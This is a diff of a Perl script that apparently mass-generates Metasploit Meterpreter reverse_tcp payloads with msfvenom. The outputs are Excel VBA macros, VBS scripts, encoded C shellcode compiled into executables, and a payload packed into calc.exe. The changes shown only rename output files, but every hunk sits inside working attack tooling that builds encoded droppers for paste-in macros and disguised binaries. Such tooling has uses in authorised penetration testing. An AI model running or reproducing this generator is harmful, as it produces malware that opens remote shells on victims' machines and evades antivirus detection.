@@ -69,10 +69,10 @@ TCPNOENC
   print "\n\n*** 004-32Bit Staged Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c $encoder > $targetFolder/005-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c $encoder > $targetFolder/005-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
   print "\n\n*** 005-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(333,"$targetFolder/005-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32.c");
+  &createShellcodeEXEFromTemplate(333,"$targetFolder/005-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c");
 
 
 
@@ -109,10 +109,10 @@ TCPNOENC
   print "\n\n*** 014-32Bit Staged Meterpreter vba encoded  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c  > $targetFolder/015-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32enc.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c  > $targetFolder/015-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32enc.c";
   print "\n\n*** 015-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(360,"$targetFolder/015-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32enc.c");
+  &createShellcodeEXEFromTemplate(360,"$targetFolder/015-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32enc.c");
 
   `touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;
 
@@ -169,10 +169,10 @@ TCPSTAGELESS32
   print "\n\n*** 064-32Bbit Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/065-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-32.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/065-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32.c";
   print "\n\n*** 065-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(957999,"$targetFolder/065-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-32.c");
+  &createShellcodeEXEFromTemplate(957999,"$targetFolder/065-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32.c");
 
   ###################
   ##
@@ -207,10 +207,10 @@ TCPSTAGELESS32
   `$cmd`;
 
   $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/075-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-32enc.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/075-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32enc.c";
   print "\n\n*** 075-32Bit Stageless Meterpreter C Shell Code, encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(333,"$targetFolder/075-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-32enc.c");
+  &createShellcodeEXEFromTemplate(333,"$targetFolder/075-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32enc.c");
 
 
   ###################
@@ -256,10 +256,10 @@ TCPNOENC64
   print "\n\n*** 104-64bit Staged Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/105-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/105-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
   print "\n\n*** 105-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(510,"$targetFolder/105-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32.c");
+  &createShellcodeEXEFromTemplate(510,"$targetFolder/105-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c");
 
 
   ###################
@@ -277,23 +277,23 @@ TCPNOENC64
   print "\n\n*** 111-64Bit Staged Meterpreter, encoded: $cmd";
   `$cmd`;
 
-  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-${PROJECT}-${PROJECTNUM}-PackedMeterpreter-calc-64enc.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-${PROJECT}-${PROJECTNUM}-StagedPackedMeterpreter-calc-64enc.exe";
   print "\n\n*** 112-64Bit Staged Meterpreter packed into putty, encoded: $cmd \n";
   `$cmd`;
 
-  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vbs";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vbs";
   print "\n\n*** 113-64Bit Staged Meterpreter vbs,encoded  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-${PROJECT}-${PROJECTNUM}-Meterpreter-64enc.vba";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vba";
   print "\n\n*** 114-64Bit staged Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-64enc.c";
   print "\n\n*** 115-64 Bit Meterpreter C Shell Code, XOR encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(631,"$targetFolder/115-${PROJECT}-${PROJECTNUM}-CShellCode-64enc.c");
+  &createShellcodeEXEFromTemplate(631,"$targetFolder/115-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-64enc.c");
 
   `touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;
 
@@ -352,10 +352,10 @@ TCPSTAGELESS64
   print "\n\n*** 164Bit Stageless Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/165-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-64.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/165-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c";
   print "\n\n*** 165-64Bit Stageless Meterpreter C Shell Code, not encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(1189423,"$targetFolder/165-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-64.c");
+  &createShellcodeEXEFromTemplate(1189423,"$targetFolder/165-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c");
 
 
   ###################
@@ -388,10 +388,10 @@ TCPSTAGELESS64
   `$cmd`;
 
 
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-64enc.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.c";
   print "\n\n*** 175-64Bit Stageless Meterpreter  C Shell Code: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(1189543,"$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessCShellCode-64enc.c");
+  &createShellcodeEXEFromTemplate(1189543,"$targetFolder/175-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.c");
 
   $payload = 'windows/x64/meterpreter/reverse_tcp';
 
